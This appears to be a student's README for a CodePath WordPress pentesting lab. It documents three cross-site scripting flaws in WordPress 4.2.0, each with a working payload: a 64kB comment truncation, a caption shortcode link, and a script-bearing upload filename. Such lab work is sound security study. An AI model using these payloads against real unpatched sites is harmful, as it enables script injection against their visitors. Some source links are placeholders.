# codepath-course
Assignment submission repository for Facebook Codepath course

# Project 7 - WordPress Pentesting

Time spent: **3** hours spent in total

> Objective: Find, analyze, recreate, and document **five vulnerabilities** affecting an old version of WordPress

## Pentesting Report

1. (Required) Vulnerability Name or ID: Unauthenticated Stored Cross-Site Scripting (XSS) #7945
  - [ ] Summary: 
    - Vulnerability types: Cross-Site Scripting
    - Tested in version:
4.2.0
    - Fixed in version: 
4.2.1
  - [ ] GIF Walkthrough: ![](unauth_stored_xss.gif)
  - [ ] Steps to recreate: 
    Craft a comment containing the following:
    ```html
    <a title='x onmouseover=alert(unescape(/hello%20world/.source)) style=position:absolute;left:0;top:0;width:5000px;height:5000px  AAAAAAAAAAAA...[64 kb]..AAA'></a>
    ```
  - [ ] Affected source code:
    - MySQL database truncates text fields longer than 64kB
    - [Link 1](https://core.trac.wordpress.org/browser/tags/version/src/source_file.php)
2. (Required) Vulnerability Name or ID: Authenticated Stored Cross-Site Scripting (XSS) #8111
  - [ ] Summary: 
    - Vulnerability types: Cross-Site Scripting
    - Tested in version:
    4.2.0
    - Fixed in version:
    4.2.3
  - [ ] GIF Walkthrough: ![](stored_xss.gif)
  - [ ] Steps to recreate: 
    As a page editor, edit the text with to include the following HTML:
    ```html
    <a href="[caption code=">]</a><a title=" onmouseover=alert('test')  ">link</a>
    ```
    Navigate to the page and mouseover the link. The script in the link will be executed.
  - [ ] Affected source code:
    - [Link 1](https://core.trac.wordpress.org/browser/tags/version/src/source_file.php)
3. (Required) Vulnerability Name or ID: Large File Upload Error XSS #8819
  - [ ] Summary: 
    - Vulnerability types: Cross-Site Scripting
    - Tested in version:
    4.2.0
    - Fixed in version: 
    4.2.15
  - [ ] GIF Walkthrough: ![](big_file_xss.gif)
  - [ ] Steps to recreate:  
    Create a file larger than the website allows for storage (default is 20MB)  
    Rename it to include script in the filename: `Dinosaurs secret life<img src=x onerror=alert(1)>.png`  
    Upload the file at `http://wpdistillery.vm/wp-admin/media-new.php` by dragging and dropping it.  
    Script executes when the page errors with `... exceeds the maximum upload size for this site.`  
  - [ ] Affected source code:
    - [Link 1](https://core.trac.wordpress.org/browser/tags/4.2/src/wp-includes/js/plupload/handlers.js)
    
## Assets

Custom crafted file `Dinosaurs secret<img src=x onerror=alert(1)>.png`

## Resources

- [WordPress Source Browser](https://core.trac.wordpress.org/browser/)
- [WordPress Developer Reference](https://developer.wordpress.org/reference/)

GIFs created with [LiceCap](http://www.cockos.com/licecap/).

## Notes

Describe any challenges encountered while doing the work

## License

    Copyright 2018 Spencer Callicott

    Licensed under the Apache License, Version 2.0 (the "License");
    you may not use this file except in compliance with the License.
    You may obtain a copy of the License at

        http://www.apache.org/licenses/LICENSE-2.0

    Unless required by applicable law or agreed to in writing, software
    distributed under the License is distributed on an "AS IS" BASIS,
    WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
    See the License for the specific language governing permissions and
    limitations under the License.
